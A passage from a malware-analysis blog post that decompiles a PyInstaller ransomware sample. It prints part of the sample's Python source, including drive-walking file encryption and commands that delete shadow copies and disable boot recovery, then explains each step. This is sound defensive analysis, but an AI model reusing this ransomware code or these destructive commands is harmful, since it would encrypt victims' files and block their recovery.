        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[WARNING] Cannot Encrypt file </span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">_LLIRBGOWCAMFAVUTAK</span><span class="p">()</span>
<span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="s">'cmd.exe /c vssadmin delete shadows /all /quiet &amp; wmic shadowcopy delete &amp; bcdedit /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no'</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">creationflags</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">CREATE_NO_WINDOW</span><span class="p">)</span>
<span class="n">extensions_to_list</span> <span class="o">=</span> <span class="p">[</span><span class="s">'.exe'</span><span class="p">,</span> <span class="s">'.dll'</span><span class="p">,</span> <span class="s">'.lnk'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">list_files</span><span class="p">(</span><span class="n">drive_path</span><span class="p">,</span> <span class="n">extensions</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">drive_path</span><span class="p">,</span> <span class="n">topdown</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
        <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">any</span><span class="p">((</span><span class="nb">file</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">ext</span><span class="p">)</span> <span class="k">for</span> <span class="n">ext</span> <span class="ow">in</span> <span class="n">extensions</span><span class="p">)):</span>
                <span class="k">continue</span>
            <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="nb">file</span><span class="p">)</span>
            <span class="n">_SSJAVGM86I7CGWDH9W</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">aes_key</span><span class="p">)</span>
<span class="k">for</span> <span class="n">drive_letter</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span><span class="p">:</span>
    <span class="n">drive_path</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">drive_letter</span><span class="si">}</span><span class="s">:/'</span>
    <span class="k">if</span> <span class="n">drive_letter</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'C'</span><span class="p">]</span> <span class="ow">and</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">drive_path</span><span class="p">):</span>
        <span class="k">pass</span>  <span class="c1"># postinserted
</span>    <span class="k">else</span><span class="p">:</span>  <span class="c1"># inserted
</span>        <span class="k">try</span><span class="p">:</span>
            <span class="n">list_files</span><span class="p">(</span><span class="n">drive_path</span><span class="p">,</span> <span class="n">extensions_to_list</span><span class="p">)</span>
<span class="k">except</span> <span class="n">PermissionError</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Access denied to </span><span class="si">{</span><span class="n">drive_path</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

</code></pre></div></div>
<p>Great! So now we managed to get the literal source code itself.</p>

<p>Let’s explain what the code does step by step:</p>

<h1 id="source-code-explanation">Source code explanation</h1>

<p>Here are the key variables:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">PUBLIC_KEY_PEM</code>: The attacker’s RSA public key, hardcoded into the malware.</li>
  <li><code class="language-plaintext highlighter-rouge">AES_KEY_PATH</code>: Where the victim’s encrypted AES key will be stored: <code class="language-plaintext highlighter-rouge">C:\ProgramData\02dq34jROu.key</code>. <code class="language-plaintext highlighter-rouge">02dq34jROu</code> is likely a generated ID for the key</li>
  <li><code class="language-plaintext highlighter-rouge">TARGET_DIRS</code>: Standard folders to attack first (Downloads, Documents, Desktop, etc.).</li>
  <li><code class="language-plaintext highlighter-rouge">EXTENSION</code>: Files will get renamed with the randomly generated ID <code class="language-plaintext highlighter-rouge">.02dq34jROu</code> after encryption (this code doesn’t show the full renaming though).</li>
</ul>

<p>The malware also uses <code class="language-plaintext highlighter-rouge">subprocess.Popen(...)</code> commands to deletes all system shadow copies and disables recovery options:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">vssadmin delete shadows /all /quiet</code></li>
  <li><code class="language-plaintext highlighter-rouge">wmic shadowcopy delete</code></li>
  <li><code class="language-plaintext highlighter-rouge">bcdedit /set {default} bootstatuspolicy ignoreallfailures</code></li>
  <li><code class="language-plaintext highlighter-rouge">bcdedit /set {default} recoveryenabled no</code></li>
</ul>

<p>This makes it harder to recover files without paying.</p>

<p><code class="language-plaintext highlighter-rouge">list_files(drive_path, extensions)</code></p>

<p>Walks through a drive letter (like D:/, E:/).</p>

<p>The encryption routine works like this:</p>

<ul>
  <li>For every file, if file is <strong>NOT</strong> .exe, .dll, or .lnk, it tries to encrypt it.</li>
  <li>For every drive letter A: to Z, i<strong>f the drive exists and is NOT C:</strong> (system drive), encrypt files on it.</li>
</ul>

<p>This ransomware has some bugs and problems, and is likely very ameatur-ish.</p>


        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/pages/Alon-Alush/alonalush.github.io/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware Analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2025-04-20T00:00:00+00:00">April 20, 2025</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Decoding+a+Pyinstaller+ransomware+sample%20https%3A%2F%2Fgithub.com%2Fpages%2FAlon-Alush%2Falonalush.github.io%2Fmalware%2520analysis%2Fpythonransomware%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgithub.com%2Fpages%2FAlon-Alush%2Falonalush.github.io%2Fmalware%2520analysis%2Fpythonransomware%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fgithub.com%2Fpages%2FAlon-Alush%2Falonalush.github.io%2Fmalware%2520analysis%2Fpythonransomware%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/pages/Alon-Alush/alonalush.github.io/injection/codecaves/" class="pagination--pager" title="Using code caves to inject custom shellcode
">Previous</a>
    
    
      <a href="/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/importaddresstable/" class="pagination--pager" title="PE file format: Import Address Table
">Next</a>
    
  </nav>

    </div>

    
      <div class="page__comments">
  
  
</div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          






<link href="https://fonts.googleapis.com/css2?family=Carter+One&display=swap" rel="stylesheet">

<a href="/pages/Alon-Alush/alonalush.github.io/ai%20world/shapesinctermination/" class="post-blog-card" style="text-decoration: none; 
    --image-url: url(/assets/images/AI%20world/shapesinc/logo.png);
    --ribbon: DodgerBlue;">

  <div class="post-meta">
    <div class="post-ribbon">
      <span class="post-ribbon4">AI world</span>
    </div>
  </div>

  <div class="post-description">
    <h1>Shapes, Inc got mass-terminated by Discord!
</h1>
    <p>  Shapes, Inc, a Discord hub for creating and talking to customized AI chatbots, just got terminated; and it doesn't lo...</p>
    
    <p class="post-date page__meta">
      03 May 2025
    </p>
  
    
      <p class="post-time page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  2 minute read

</p>
    

  </div>
</a>



<!-- <div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/pages/Alon-Alush/alonalush.github.io/assets/images/AI%20world/shapesinc/logo.png" alt="">
      </div>
    

    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/pages/Alon-Alush/alonalush.github.io/ai%20world/shapesinctermination/" rel="permalink">Shapes, Inc got mass-terminated by Discord!
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  2 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">Explaining the Discord controversy

Shapes.inc is a platform that allows users to create and host their so-called “Shapes”, which are AI-powered chatbots tha...</p>
    

  </article>
</div> -->

        
          






<link href="https://fonts.googleapis.com/css2?family=Carter+One&display=swap" rel="stylesheet">

<a href="/pages/Alon-Alush/alonalush.github.io/unpacking/vmprotectleak/" class="post-blog-card" style="text-decoration: none; 
    --image-url: url(/assets/images/unpacking/vmprotectleak/dump.png);
    --ribbon: DodgerBlue;">

  <div class="post-meta">
    <div class="post-ribbon">
      <span class="post-ribbon4">Unpacking</span>
    </div>
  </div>

  <div class="post-description">
    <h1>The breach of VMProtect: 2 major incidents
</h1>
    <p>  Discussing the breaches of VMProtect's source code that emerged in 2023</p>
    
    <p class="post-date page__meta">
      26 Apr 2025
    </p>
  
    
      <p class="post-time page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  1 minute read

</p>
    

  </div>
</a>



<!-- <div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/pages/Alon-Alush/alonalush.github.io/assets/images/unpacking/vmprotectleak/dump.png" alt="">
      </div>
    

    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/pages/Alon-Alush/alonalush.github.io/unpacking/vmprotectleak/" rel="permalink">The breach of VMProtect: 2 major incidents
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  1 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">VMProtect leak

In 2023, VMProtect, a commercial virtualization-based protector for executable files, was leaked — not once, but twice.

First, a dump of the...</p>
    

  </article>
</div> -->

        
          






<link href="https://fonts.googleapis.com/css2?family=Carter+One&display=swap" rel="stylesheet">

<a href="/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/dosheader/" class="post-blog-card" style="text-decoration: none; 
    --image-url: url(/assets/images/pefileformat/iat/image.png);
    --ribbon: DodgerBlue;">

  <div class="post-meta">
    <div class="post-ribbon">
      <span class="post-ribbon4">PE File Format</span>
    </div>
  </div>

  <div class="post-description">
    <h1>PE file format: DOS Header
</h1>
    <p>  Explaining the DOS header in Windows executable formats</p>
    
    <p class="post-date page__meta">
      22 Apr 2025
    </p>
  
    
      <p class="post-time page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  5 minute read

</p>
    

  </div>
</a>



<!-- <div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/pages/Alon-Alush/alonalush.github.io/assets/images/pefileformat/iat/image.png" alt="">
      </div>
    

    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/dosheader/" rel="permalink">PE file format: DOS Header
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  5 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">DOS header

First of all, what’s the DOS header?

The DOS header is a structure located right at the start of DOS-MZ executables, and preserved on the newer ...</p>
    

  </article>
</div> -->

        
          






<link href="https://fonts.googleapis.com/css2?family=Carter+One&display=swap" rel="stylesheet">

<a href="/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/importaddresstable/" class="post-blog-card" style="text-decoration: none; 
    --image-url: url(/assets/images/pefileformat/iat/image.png);
    --ribbon: DodgerBlue;">

  <div class="post-meta">
    <div class="post-ribbon">
      <span class="post-ribbon4">PE File Format</span>
    </div>
  </div>

  <div class="post-description">
    <h1>PE file format: Import Address Table
</h1>
    <p>  Explaining in detail the Import Address Table (IAT) structure in Portable Executable (PE) file</p>
    
    <p class="post-date page__meta">
      21 Apr 2025
    </p>
  
    
      <p class="post-time page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  1 minute read

</p>
    

  </div>
</a>



<!-- <div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/pages/Alon-Alush/alonalush.github.io/assets/images/pefileformat/iat/image.png" alt="">
      </div>
    

    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/importaddresstable/" rel="permalink">PE file format: Import Address Table
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  1 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">PE file format: Import Address Table

The Import Address Table stores the memory addresses of external functions that the program uses
Example

Here, we can ...</p>
    

  </article>
</div> -->

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
    

    <li><a href="/pages/Alon-Alush/alonalush.github.io/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2025 Alon Alush. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/pages/Alon-Alush/alonalush.github.io/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/pages/Alon-Alush/alonalush.github.io/assets/js/lunr/lunr.min.js"></script>
<script src="/pages/Alon-Alush/alonalush.github.io/assets/js/lunr/lunr-store.js"></script>
<script src="/pages/Alon-Alush/alonalush.github.io/assets/js/lunr/lunr-en.js"></script>




  <script>
  window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
  ga('create','','auto');
  ga('set', 'anonymizeIp', false);
  ga('send','pageview')
</script>
<script src="https://www.google-analytics.com/analytics.js" async></script>






    <script>
    'use strict';
  
    (function () {
      var commentContainer = document.querySelector('#giscus-comments');
  
      if (!commentContainer) {
        return;
      }
  
      var script = document.createElement('script');
  
      script.setAttribute('src', 'https://giscus.app/client.js');
      script.setAttribute('data-repo', 'alon-alush/alonalush.github.io');
      script.setAttribute('data-repo-id', 'R_kgDOObwnXA');
      script.setAttribute('data-category', 'Comments');
      script.setAttribute('data-category-id', 'DIC_kwDOObwnXM4CpwzY');
      script.setAttribute('data-mapping', 'pathname');
      script.setAttribute('data-strict', '0');
      script.setAttribute('data-reactions-enabled', '1');
      script.setAttribute('data-emit-metadata', '0');
      script.setAttribute('data-input-position', 'top');
      script.setAttribute('data-theme', 'dark');
      script.setAttribute('data-lang',  'en');
      script.setAttribute('crossorigin', 'anonymous');
  
      script.setAttribute('async', '');
  
      commentContainer.appendChild(script);
    })();
  </script>
  





  </body>
</html>
